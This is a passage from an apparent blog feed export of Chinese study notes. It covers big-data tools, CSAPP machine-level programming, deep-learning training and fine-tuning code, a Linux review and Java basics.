<li>Apache Hive是一款以SQL为主要开发语言的分布式计算框架</li>
<li>其底层使用了Hadoop的MapReduce技术</li>
<li>Apache Hive至今仍活跃在大数据一线，被许多公司使用</li>
<li>写的是SQL语句，背后运行的是MapReduce程序</li>
<li>相比用MapReduce，工作量少了很多</li>
</ul>
</li>
<li>Apache Spark
<ul>
<li>Apache Spark是目前全球范围内最火热的分布式内存计算引擎，是大数据体系中的明星计算产品</li>
<li>速度更快，因为主要基于内存，不够的时候会用一部分磁盘；</li>
<li>而MapReduce是基于磁盘内存不断进行IO操作</li>
</ul>
</li>
<li>Apache Flink
<ul>
<li>Apache Flink同样也是一款明星级的大数据分布式内存计算引擎</li>
<li>特别是在实时计算（流计算）领域占据了大多数国内市场</li>
<li>例：阿里双11 大屏显示实时数据 用的就是Flink</li>
<li>目前Flink也是阿里在维护，阿里是国内最大用户</li>
<li>因为可以支持实时计算显示，所以成本较高，目前市占率较小</li>
</ul>
</li>
</ul>
<h4 id="数据传输"><a class="header-anchor" href="#数据传输">¶</a>数据传输</h4>
<ul>
<li>
<p>Apache Sqoop</p>
<ul>
<li>Apache Sqoop是一款ETL工具，可以协助大数据体系和关系型数据库之间进行数据传输</li>
<li>ETL：对数据进行抽取、转换、加载的过程</li>
<li>有个岗位叫ETL工程师</li>
<li>阿里出的一个工具datax也是一个ETL工具</li>
<li>用的比较多的ETL根据：Sqoop和datax</li>
</ul>
</li>
<li>
<p>Apache Flume</p>
<ul>
<li>Apache Flume是一款【流式】数据采集工具，可以从非常多的数据源中完成数据采集传输任务</li>
</ul>
</li>
<li>
<p>Apache Kafka</p>
<ul>
<li>Apache Kafka是一款分布式的消息系统，可以完成海量规模的数据传输工作</li>
<li>Apache Kafka在大数据领域也是明星产品</li>
</ul>
</li>
<li>
<p>Apache Pulsar</p>
<ul>
<li>Apache Pulsar同样是一款分布式的消息系统</li>
<li>在大数据领域同样有非常多使用者</li>
</ul>
</li>
</ul>
<h4 id="小结"><a class="header-anchor" href="#小结">¶</a>小结</h4>
<h5 id="学习阶段"><a class="header-anchor" href="#学习阶段">¶</a>学习阶段</h5>
<ul>
<li>学习狭义的大数据技术栈</li>
</ul>
<h5 id="大数据核心工作"><a class="header-anchor" href="#大数据核心工作">¶</a>大数据核心工作</h5>
<ul>
<li>利用数据存储技术栈解决海量的数据存储问题</li>
<li>利用数据计算技术栈解决海量的数据计算问题</li>
<li>利用数据传输技术栈解决海量的数据传输问题</li>
</ul>
<h2 id="大数据学习规划"><a class="header-anchor" href="#大数据学习规划">¶</a>大数据学习规划</h2>
<p>此处缺一张图  72:35</p>
<p>此处还缺一张图  75:37</p>
<p>此处又缺一张图  78:49</p>
<p>81:09</p>
<p>81:49</p>
<p>103:36</p>
<h2 id="大学生秋季招聘"><a class="header-anchor" href="#大学生秋季招聘">¶</a>大学生秋季招聘</h2>
<ul>
<li>大学生就业服务平台</li>
<li>高效人才网</li>
<li>国聘网</li>
<li>中国国家人才网</li>
<li>中国人力资源开发网</li>
<li>中国就业网</li>
<li>各大企业官网、公众号</li>
<li>不止在boss直聘上</li>
<li>简历上不要写qq邮箱</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>【CSAPP】第三章 程序的机器级表示</title>
    <url>/project/2024/07/24/CS_Notes/CSAPP/%E3%80%90CSAPP%E3%80%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>学pwn的过程中被建议是看CSAPP的第三章</p>
<ul>
<li>宝藏链接
<ul>
<li><a href="https://fengmuzi2003.gitbook.io/csapp3e/di-3-zhang-ji-qi-ji-bian-cheng">第03章：程序的机器级表示 | CSAPP重点解读 (gitbook.io)</a>  这个是第三章的别人做好的笔记，可以参考着看</li>
<li><a href="https://wdxtub.com/work/">不周山作品集 | 小土刀 2.0 (wdxtub.com)</a></li>
</ul>
</li>
</ul>
<h3 id="序"><a class="header-anchor" href="#序">¶</a>序</h3>
<ul>
<li>
<p>因为对于概念还是有点模糊，所以笔记上我就选择摘抄理解了先。。。到实践部分再搞别的形式。。</p>
</li>
<li>
<p>使用高级语言编程时，机器屏蔽了程序的细节，即机器级的实现；</p>
<ul>
<li>用汇编代码编程的时候，程序员必须指定程序用来执行计算的低级指令</li>
</ul>
</li>
<li>
<p>汇编代码最大的优点：</p>
<ul>
<li>用高级语言编写的程序可以在很多不同的机器上编译和执行</li>
<li>汇编代码则是与特定机器密切相关</li>
</ul>
</li>
<li>
<p>对于汇编代码：</p>
<ul>
<li>能够阅读和理解</li>
</ul>
</li>
<li>
<p>阅读汇编代码的好处：</p>
<ul>
<li>能够理解编译器的优化能力</li>
<li>分析代码中隐含的低效率</li>
<li>从而最大化一段关键代码性能</li>
</ul>
</li>
<li>
<p>需要具备程序机器级的知识</p>
<ul>
<li>许多攻击利用了系统程序中的漏洞重写信息，从而获得了系统的控制权</li>
<li>了解这些漏洞如何出现以及如何防御他们</li>
</ul>
</li>
<li>
<p>了解如何将C程序编译成这种形式的机器代码</p>
<ul>
<li>优化编译器能够
<ul>
<li>重新排列执行顺序</li>
<li>消除不必要的计算</li>
<li>用快速操作替换慢速操作</li>
<li>甚至将递归计算变换成迭代计算</li>
</ul>
</li>
</ul>
</li>
<li>
<p>逆向工程（reverse engineering）</p>
<ul>
<li>通过研究系统和逆向工程，来试图了解系统的创建过程</li>
<li>此处的<strong>系统</strong>是一个<strong>机器产生的汇编语言程序</strong></li>
</ul>
</li>
<li>
<p><strong>x86-64</strong></p>
<ul>
<li>是现在笔记本电脑和台式机中最常见处理器的机器语言</li>
<li>也是驱动大型数据中心和超级计算机的最常见处理器的机器语言</li>
</ul>
</li>
<li>
<p><strong>IA32编程</strong></p>
<ul>
<li>x86-64的32位前身</li>
<li>大多数x86微处理器，以及这些机器上安装的大多数操作系统，都是为运行x86-64设计的，也可以向后兼容执行IA32程序</li>
</ul>
</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>CSAPP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>【CV夏令营】Task 2</title>
    <url>/project/2024/07/15/CS_Notes/CV/%E3%80%90CV%E5%A4%8F%E4%BB%A4%E8%90%A5%E3%80%91Task-2/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>111</p>
<h3 id="Part-2：深度学习的训练"><a class="header-anchor" href="#Part-2：深度学习的训练">¶</a>Part 2：深度学习的训练</h3>
<h4 id="梯度下降算法"><a class="header-anchor" href="#梯度下降算法">¶</a>梯度下降算法</h4>
<h5 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h5>
<p>损失函数的梯度指向函数增长最快的方向</p>
<p><img src="blob:https://datawhaler.feishu.cn/082aee3d-e48f-49a9-8b0e-b02844320472" alt="img"></p>
<h5 id="训练过程"><a class="header-anchor" href="#训练过程">¶</a>训练过程</h5>
<ul>
<li>首先加载一小批量数据，将其输入到神经网络中进行前向传播，计算出网络的输出</li>
<li>然后使用损失函数来计算当前批次的损失，并通过反向传播算法计算损失函数关于每个参数的梯度。</li>
<li><strong>梯度</strong>→如何<strong>调整权重和偏置</strong>以减少损失。</li>
<li>当数据集非常大时，一次性处理所有数据可能会导致内存不足或计算过于缓慢。通过将数据<strong>分成小批量</strong>，可以更<strong>频繁地更新模型参数</strong>，这使得训练过程更加高效</li>
</ul>
<h4 id="Pytorch训练代码"><a class="header-anchor" href="#Pytorch训练代码">¶</a>Pytorch训练代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">事先准备：</span></span><br><span class="line"><span class="string">一批图片数据（通过train_loader）和这些图片对应的正确标签（target）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">train_loader, model, criterion, optimizer, epoch</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># switch to train mode  将模型设置为训练模式</span></span><br><span class="line">    model.train()</span><br><span class="line">    </span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">for</span> i, (<span class="built_in">input</span>, target) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;给模型喂图片数据，让它尝试预测这些图片的内容&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">input</span> = <span class="built_in">input</span>.cuda(non_blocking=<span class="literal">True</span>)</span><br><span class="line">        target = target.cuda(non_blocking=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># compute output</span></span><br><span class="line">        output = model(<span class="built_in">input</span>)  <span class="comment"># 预测结果</span></span><br><span class="line">        loss = criterion(output, target)  <span class="comment"># 预测结果与实际标签之间的差异</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># -------更新内部参数来减少错误|模型自我调整------</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br></pre></td></tr></table></figure>
<ul>
<li>总结：（图像|文本|音频数据）的深度学习训练步骤
<ul>
<li>训练开始前，对数据进行加载、预处理和分割</li>
<li>涉及到数据加载器。其将数据集分成小批量，确保数据在训练过程中被正确地处理</li>
<li>训练代码包括：前向传播 | 计算损失 | 反向传播 | 参数更新</li>
<li>这个过程会重复进行多轮（epoch），直到模型性能达到预期目标</li>
</ul>
</li>
</ul>
<h3 id="Part-3：深度学习与迁移学习"><a class="header-anchor" href="#Part-3：深度学习与迁移学习">¶</a>Part 3：深度学习与迁移学习</h3>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>迁移学习是一种机器学习技术，它将已在一个任务上学到的知识（如模型参数、特征表示等）应用到另一个相关任务上。这种技术特别有用，因为它允许模型在数据稀缺的情况下也能表现出色。</li>
<li><strong>通常使用在大规模数据集上预训练的模型作为起点，例如在ImageNet数据集上预训练的卷积神经网络（CNN）。在预训练模型的基础上，使用少量标记数据对模型进行微调，以适应新任务</strong></li>
</ul>
<h4 id="使用到ImageNet"><a class="header-anchor" href="#使用到ImageNet">¶</a>使用到ImageNet</h4>
<ul>
<li>它的规模之大使得它成为深度学习模型训练和评估的理想数据集</li>
<li><a href="https://www.image-net.org/">https://www.image-net.org/</a></li>
<li>ImageNet 数据集中的图像包含了各种场景、物体、背景和遮挡情况，这为算法提供了极大的挑战。这种多样性使得在 ImageNet 上训练的模型能够学习到鲁棒的特征</li>
</ul>
<h4 id="迁移学习的实现方法"><a class="header-anchor" href="#迁移学习的实现方法">¶</a>迁移学习的实现方法</h4>
<h5 id="微调"><a class="header-anchor" href="#微调">¶</a>微调</h5>
<p>微调（Fine-tuning）是深度学习中一种有效的迁移学习策略，它允许我们利用预训练模型对特定任务进行优化</p>
<h6 id="基本原理"><a class="header-anchor" href="#基本原理">¶</a>基本原理</h6>
<ul>
<li>
<p>首先在一个大规模的数据集上<strong>预训练</strong>一个深度学习模型，捕捉<strong>通用的特征表示</strong></p>
</li>
<li>
<p>然后将这个预训练模型作为<strong>起点</strong>，在目标任务上进行进一步的训练以提升模型的性能</p>
</li>
</ul>
<h6 id="过程"><a class="header-anchor" href="#过程">¶</a>过程</h6>
<ul>
<li>通常开始于选择一个在大型数据集上预训练的模型，这个预训练模型已经学到了丰富的特征表示，这些特征在广泛的领域内都是通用的</li>
<li>接着，我们将这个预训练模型适配到新的目标任务上
<ul>
<li>替换模型的输出层，以匹配目标任务的类别数量和类型
<ul>
<li>例如，如果目标任务是图像分类，而预训练模型原本用于不同的分类任务，我们就需要将模型的最后一层替换成适合新任务类别数的新层</li>
</ul>
</li>
<li>【可做可不做】冻结预训练模型中的大部分层，这样可以防止在微调过程中这些层学到的通用特征被破坏。通常情况下，只对模型的最后一部分层进行解冻，这些层负责学习任务特定的特征</li>
<li>使用目标任务的数据集对模型进行训练。在这个过程中，我们会用梯度下降等优化算法更新模型的权重，从而使模型能够更好地适应新的任务。训练时，可能会使用比预训练时更低的学习率，以避免过度拟合目标数据集</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timm</span><br><span class="line">model = timm.create_model(<span class="string">&#x27;resnet18&#x27;</span>, pretrained=<span class="literal">True</span>, num_classes=<span class="number">2</span>)  </span><br><span class="line"><span class="string">&quot;&quot;&quot;加载一个预训练的ResNet-18模型，pretrained=True表示使用在ImageNet数据集上预训练的权重，num_classes=2表示模型的输出层被修改为有2个类别的输出，以适应二分类任务（例如区分真实和Deepfake图像）&quot;&quot;&quot;</span></span><br><span class="line">model = model.cuda()  </span><br><span class="line"><span class="comment"># model = model.cuda()将模型移动到GPU上进行加速</span></span><br></pre></td></tr></table></figure>
<h3 id="Part-4：常见的图像分类网络"><a class="header-anchor" href="#Part-4：常见的图像分类网络">¶</a>Part 4：常见的图像分类网络</h3>
<ul>
<li>图像分类是计算机视觉中的一个基本任务，它涉及到将给定的图像分配到一个或多个预定义的类别中</li>
</ul>
<h4 id="AlexNet"><a class="header-anchor" href="#AlexNet">¶</a>AlexNet</h4>
<ul>
<li>
<p><a href="https://en.wikipedia.org/wiki/AlexNet">https://en.wikipedia.org/wiki/AlexNet</a></p>
</li>
<li>
<p>AlexNet包含八个层次结构，前五个是卷积层，其中一些后跟最大池化层，最后三个是全连接层。具体结构如下：</p>
<ol>
<li>卷积层：AlexNet的前五个层次都是卷积层，每个卷积层后面跟着一个ReLU激活函数，以引入非线性。这些卷积层旨在提取图像的特征。</li>
<li>局部响应归一化（LRN）：在某些卷积层后使用了局部响应归一化，这是一种提高模型泛化能力的正则化方法。</li>
<li>最大池化层：在部分卷积层之后使用最大池化层来降低特征的空间维度，减少计算量和过拟合的风险。</li>
<li>全连接层：网络的最后三个层次是全连接层，其中最后两个全连接层后跟有Dropout，以进一步防止过拟合。</li>
<li>输出层：最后一个全连接层后是线性层，然后是softmax激活函数，输出1000个类别上的概率分布。</li>
</ol>
</li>
</ul>
<h4 id="ResNet"><a class="header-anchor" href="#ResNet">¶</a>ResNet</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Residual_neural_network">https://en.wikipedia.org/wiki/Residual_neural_network</a></li>
<li><strong>主要创新点</strong>：引入了残差学习的概念，允许训练非常深的网络，从而缓解了深度神经网络训练中的梯度消失和梯度爆炸问题</li>
<li><strong>核心</strong>：残差块（residual block），网络通过堆叠这些残差块来构建。一个基本的残差块包含以下几部分：
<ol>
<li>跳跃连接（Skip Connections）：这是ResNet最关键的创新，通过跳跃连接，输入可以直接绕过一个或多个层传到输出，输出是输入与这些层的输出的加和。这种结构使得网络可以学习输入到输出的残差，而不是直接学习输出，这有助于缓解梯度消失问题。</li>
<li>卷积层：残差块内部包含多个卷积层，通常使用小尺寸的卷积核（如3x3），并且通常会有批量归一化（Batch Normalization）和ReLU激活函数。</li>
<li>池化层：在某些残差块之间会插入最大池化层来降低特征图的空间维度。</li>
</ol>
</li>
<li>ResNet有多个变种，包括ResNet-50、ResNet-101、ResNet-152等，数字代表了网络中权重层的数量。这些变种在网络的深度和宽度上有所不同，但都基于相同的残差学习架构。<strong>ResNet能够成功训练超过100层的网络，这在之前是不可能实现的</strong></li>
</ul>
<h4 id="EfficientNet"><a class="header-anchor" href="#EfficientNet">¶</a>EfficientNet</h4>
<ul>
<li><a href="https://paperswithcode.com/method/efficientnet">https://paperswithcode.com/method/efficientnet</a></li>
<li>是一种高效的卷积神经网络（CNN）架构，它通过一种新颖的网络缩放方法来提升模型的性能和效率。</li>
<li><strong>核心</strong>:其 compound scaling 方法.
<ul>
<li>该方法通过一个复合系数统一缩放网络的深度、宽度和分辨率。</li>
<li>在过去，网络缩放通常是通过任意选择深度、宽度或分辨率的增加来实现的，而EfficientNet的方法则是通过一系列固定的缩放系数来同时增加这三个维度。
<ul>
<li>例如，如果想要使用更多的计算资源，可以通过增加网络深度、宽度和图像大小的特定比例来实现，其中的比例系数是通过在小型模型上进行小规模的网格搜索确定的</li>
</ul>
</li>
<li>EfficientNet的复合缩放方法的直觉在于，如果输入图像更大，网络就需要更多的层来增加感受野，以及更多的通道来捕捉更细粒度的模式。</li>
<li>EfficientNet的架构本质上并不复杂。基本的EfficientNet-B0网络作为后续缩放的基础。作者指出，他们使用NAS来构建基本网络，利用了多目标搜索来同时优化网络的准确性和计算效率</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>CV notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>CV</tag>
      </tags>
  </entry>
  <entry>
    <title>【saveMyLinux】Linux课程要点复习</title>
    <url>/project/2024/07/12/CS_Notes/Linux/%E3%80%90saveMyLinux%E3%80%91Linux%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>翘佳人的Linux缓考复习伊始</li>
</ul>
<h3 id="复习提纲-pdf"><a class="header-anchor" href="#复习提纲-pdf">¶</a>复习提纲.pdf</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<!-- <iframe src="https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1" -->
</div>]]></content>
      <categories>
        <category>notes</category>
        <category>Linux notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】坤础复习扫盲</title>
    <url>/project/2024/07/20/CS_Notes/Java/%E3%80%90Java%E3%80%91%E5%9D%A4%E7%A1%80%E5%A4%8D%E4%B9%A0%E6%89%AB%E7%9B%B2/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>根据以下两份，只摘出其中还不会或者不太熟练的部分，额外关注一下</li>
<li>Java基础入门（上）.pdf</li>
</ul>
<p>文件还没上传处理，先放着</p>
<ul>
<li>Java基础入门（下）.pdf</li>
</ul>
<p>文件还没上传处理，先放着</p>
<h1>由此始</h1>
<h2 id="Day1-Java基础语法"><a class="header-anchor" href="#Day1-Java基础语法">¶</a>Day1 Java基础语法</h2>
<h3 id="常见CMD命令"><a class="header-anchor" href="#常见CMD命令">¶</a>常见CMD命令</h3>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>盘符名称:</td>
<td>盘符切换。E:回⻋，表⽰切换到E盘。</td>
</tr>
<tr>
<td>dir</td>
<td>查看当前路径下的内容。</td>
</tr>
<tr>
<td>cd ⽬录</td>
<td>进⼊单级⽬录。cd itheima</td>
</tr>
<tr>
<td>cd …</td>
<td>回退到上⼀级⽬录。</td>
</tr>
<tr>
<td>cd ⽬录1\⽬录2…</td>
<td>进⼊多级⽬录。cd itheima\JavaSE</td>
</tr>
<tr>
<td>cd \</td>
<td>回退到盘符⽬录。</td>
</tr>
<tr>
<td>cls</td>
<td>清屏。</td>
</tr>
<tr>
<td>exit</td>
<td>退出命令提⽰符窗⼝。</td>
</tr>
</tbody>
</table>
<ul>
<li>CMD练习：<code>qq.exe</code>启动qq     hhhhhhh</li>
</ul>
<h3 id="环境变量"><a class="header-anchor" href="#环境变量">¶</a>环境变量</h3>
<ul>
<li>
<p>作⽤：如果我想要在<strong>CMD的任意⽬录下</strong>，都可以<strong>启动某⼀个软件</strong>，那么就可以把这个软件的路径配置到环境变量中的PATH⾥⾯。</p>
</li>
<li>
<p>在启动软件的时候，操作系统会先在<strong>当前路径</strong>下找，如果在当前录课没有再到<strong>环境变量的路径</strong>中去找。如果都找不到就提⽰⽆法启动。</p>
</li>
<li>
<p>在CMD中打开软件时，会先找当前路径，再找环境变量，在环境变量中是从上往下依次查找的，如果路径放在最上⾯查找的速度⽐较快。</p>
</li>
</ul>
<h3 id="Java版本"><a class="header-anchor" href="#Java版本">¶</a>Java版本</h3>
<ul>
<li>
<p>Java的版本<strong>向下兼容</strong>。新的版本只是在原有的基础上添加了⼀些新的功能⽽已。</p>
</li>
<li>
<p>举例：</p>
<ul>
<li>⽤8版本开发的代码，⽤11版本能运⾏吗？必须可以的。</li>
<li>⽤11版本开发的代码，⽤8版本能运⾏吗？不⼀定。</li>
<li>如果11版本开发的代码，没有⽤到9-11的新特性，那么⽤8是可以运⾏的。</li>
<li>如果11版本开发的代码，⽤到了9-11的新特性，那么⽤8就⽆法运⾏了。</li>
</ul>
</li>
</ul>
<h3 id="Java三大平台"><a class="header-anchor" href="#Java三大平台">¶</a>Java三大平台</h3>
<ul>
<li>JavaSE、JavaME、JavaEE</li>
</ul>
<h4 id="JavaSE"><a class="header-anchor" href="#JavaSE">¶</a>JavaSE</h4>
<p>是其他两个版本的基础</p>
<h4 id="JavaME"><a class="header-anchor" href="#JavaME">¶</a>JavaME</h4>
<p>Java语⾔的⼩型版，⽤于嵌⼊式消费类电⼦设备或者⼩型移动设备的开发。其中最为主要的还是⼩型移动设备的开发（⼿机）。渐渐的没落了，已经被安卓和IOS给替代了。但是，安卓也是可以⽤Java来开发的。</p>
<h4 id="JavaEE"><a class="header-anchor" href="#JavaEE">¶</a>JavaEE</h4>
<p>⽤于Web⽅向的⽹站开发（主要从事后台服务器的开发），在服务器领域，Java是当之⽆愧的⻰头⽼</p>
<p>⼤。</p>
<h3 id="Java主要特性"><a class="header-anchor" href="#Java主要特性">¶</a>Java主要特性</h3>
<ul>
<li>⾯向对象</li>
<li>安全性</li>
<li>多线程</li>
<li>简单易⽤</li>
<li>开源</li>
<li>跨平台</li>
</ul>
<h4 id="Java语言跨平台的原理"><a class="header-anchor" href="#Java语言跨平台的原理">¶</a>Java语言跨平台的原理</h4>
<ul>
<li>
<p>操作系统本⾝其实是不认识Java语⾔的。</p>
</li>
<li>
<p>但是针对于不同的操作系统，Java提供了不同的虚拟机。</p>
</li>
<li>
<p>虚拟机会把Java语⾔翻译成操作系统能看得懂的语⾔。</p>
</li>
<li>
<p>Java程序—javac编译→Class文件</p>
<ul>
<li>→Windows版JVM虚拟机</li>
<li>→Linux版JVM虚拟机</li>
<li>→MacOS版JVM虚拟机</li>
</ul>
</li>
</ul>
<h4 id="JRE和JDK"><a class="header-anchor" href="#JRE和JDK">¶</a>JRE和JDK</h4>
<ul>
<li>
<p>JVM（Java Virtual Machine），Java虚拟机</p>
</li>
<li>
<p>JRE（Java Runtime Environment），Java运⾏环境，包含了JVM和Java的核⼼类库（Java API）</p>
</li>
<li>
<p>JDK（Java Development Kit）称为Java开发⼯具，包含了JRE和开发⼯具</p>
</li>
</ul>
<p>———————————————————————————————————————</p>
<p>|											JDK															  |</p>
<p>|			JVM				核心类库			开发工具								|</p>
<p>|————————————————————————————————————|</p>
<p>———————————————————————————————————————</p>
<p>|											JRE															  |</p>
<p>|			JVM				核心类库			运行工具								|</p>
<p>|————————————————————————————————————|</p>
<ul>
<li>只需安装JDK即可，它包含了java的运⾏环境和虚拟机</li>
</ul>
<h2 id="Day2-Java基础语法"><a class="header-anchor" href="#Day2-Java基础语法">¶</a>Day2 Java基础语法</h2>
<h3 id="Java语言数据类型的分类"><a class="header-anchor" href="#Java语言数据类型的分类">¶</a>Java语言数据类型的分类</h3>
<ul>
<li>基本数据类型</li>
<li>引用数据类型（在面向对象阶段深入）</li>
</ul>
<h4 id="基础数据类型的四类八种"><a class="header-anchor" href="#基础数据类型的四类八种">¶</a>基础数据类型的四类八种</h4>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>关键字</th>
<th>内存占用</th>
<th>取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>整数</td>
<td>byte</td>
<td>1</td>
<td>负的2的7次⽅ ~ 2的7次⽅-1(-128~127)</td>
</tr>
<tr>
<td></td>
<td>short</td>
<td>2</td>
<td>负的2的15次⽅ ~ 2的15次⽅-1(-32768~32767)</td>
</tr>
<tr>
<td></td>
<td>int</td>
<td>4</td>
<td>负的2的31次⽅ ~ 2的31次⽅-1</td>
</tr>
<tr>
<td></td>
<td>long</td>
<td>8</td>
<td>负的2的63次⽅ ~ 2的63次⽅-1</td>
</tr>
<tr>
<td>浮点数</td>
<td>float</td>
<td>4</td>
<td>1.401298e-45 ~ 3.402823e+38</td>
</tr>
<tr>
<td></td>
<td>double</td>
<td>8</td>
<td>4.9000000e-324 ~ 1.797693e+308</td>
</tr>
<tr>
<td>字符</td>
<td>char</td>
<td>2</td>
<td>0-65535</td>
</tr>
<tr>
<td>布尔</td>
<td>boolean</td>
<td>1</td>
<td>true, false</td>
</tr>
</tbody>
</table>
<ul>
<li>Java中整数默认是int类型，浮点数默认是double类型</li>
<li>记忆以下几点：
<ul>
<li>byte 类型的取值范围：<code> -128 ~ 127</code></li>
<li>int 类型的⼤概取值范围： <code>-21亿多 ~ 21亿多</code></li>
<li>整数类型和⼩数类型的取值范围⼤⼩关系： <code>double &gt; float &gt; long &gt; int &gt; short &gt; byte</code></li>
</ul>
</li>
</ul>
<h4 id="最为常用的数据类型选择"><a class="header-anchor" href="#最为常用的数据类型选择">¶</a>最为常用的数据类型选择</h4>
<ul>
<li>在定义变量的时候，要根据实际的情况来选择不同类型的变量
<ul>
<li>⼈的年龄，可以选择 byte 类型</li>
<li>地球的年龄，可以选择 long 类型</li>
<li>如果整数类型中，不太确定范围，那么默认使⽤ int 类型</li>
<li>如果⼩数类型中，不太确定范围，那么默认使⽤ double 类型</li>
<li>如果要定义字符类型的变量，那么使⽤ char</li>
<li>如果要定义布尔类型的变量，那么使⽤ boolean</li>
</ul>
</li>
</ul>
<h4 id="定义8种基本数据类型变量"><a class="header-anchor" href="#定义8种基本数据类型变量">¶</a>定义8种基本数据类型变量</h4>
<ul>
<li>注意点
<ul>
<li>如果要定义 ⼀个整数类型的变量，不知道选择哪种数据类型了，默认使⽤ int。</li>
<li>如果要定义 ⼀个⼩数类型的变量，不知道选择哪种数据类型了，默认使⽤ double。</li>
<li>如果要定义⼀个 long 类型的变量，在数据值的后⾯需要加上 L 后缀。(⼤⼩写都可以，建议⼤写)</li>
<li>如果要定义⼀个 float 类型的变量，在数据值的后⾯需要加上 F 后缀。(⼤⼩写都可以）</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.定义byte类型的变量</span></span><br><span class="line"><span class="comment">//数据类型 变量名 = 数据值;</span></span><br><span class="line"><span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.定义short类型的变量</span></span><br><span class="line"><span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.定义long类型的变量</span></span><br><span class="line"><span class="type">long</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">123456789123456789L</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.定义float类型的变量</span></span><br><span class="line"><span class="type">float</span> <span class="variable">e</span> <span class="operator">=</span> <span class="number">10.1F</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//8.定义boolean类型的变量</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">h</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<h3 id="IDEA中层级结构介绍"><a class="header-anchor" href="#IDEA中层级结构介绍">¶</a>IDEA中层级结构介绍</h3>
<h4 id="结构分类"><a class="header-anchor" href="#结构分类">¶</a>结构分类</h4>
<ul>
<li>project（项⽬、⼯程）</li>
<li>module（模块）</li>
<li>package（包）</li>
<li>class（类）</li>
</ul>
<h5 id="结构介绍"><a class="header-anchor" href="#结构介绍">¶</a>结构介绍</h5>
<ul>
<li>
<p>最基础的 project、module、class。</p>
<ul>
<li>project（项⽬、⼯程）
<ul>
<li>淘宝、京东、⿊⻢程序员⽹站都属于⼀个个项⽬，IDEA 中就是⼀个个的 Project。</li>
</ul>
</li>
<li>module（模块）
<ul>
<li>在⼀个项⽬中，可以存放多个模块，不同的模块可以存放项⽬中不同的业务功能代码。在⿊⻢程序员的官⽅⽹站中，⾄少包含了以下模块：
<ul>
<li>论坛模块</li>
<li>报名、咨询模块</li>
<li>为了更好的管理代码，我们会把代码分别放在两个模块中存放。</li>
</ul>
</li>
</ul>
</li>
<li>package（包）
<ul>
<li>⼀个模块中⼜有很多的业务，以⿊⻢程序员官⽅⽹站的论坛模块为例，⾄少包含了以下不同的业务。</li>
<li>发帖</li>
<li>评论</li>
<li>为了把这些业务区分的更加清楚，就会⽤包来管理这些不同的业务。</li>
</ul>
</li>
<li>class（类）
<ul>
<li>就是真正写代码的地⽅。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>层级关系 project - module - package - class</p>
<ul>
<li>包含数量
<ul>
<li>project 中可以创建多个 module</li>
<li>module 中可以创建多个 package</li>
<li>package 中可以创建多个 class</li>
<li>这些结构的划分，是为了⽅便管理类⽂件的。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="IDEA代码步骤"><a class="header-anchor" href="#IDEA代码步骤">¶</a>IDEA代码步骤</h5>
<ul>
<li>创建Project项目</li>
<li>创建Module模块</li>
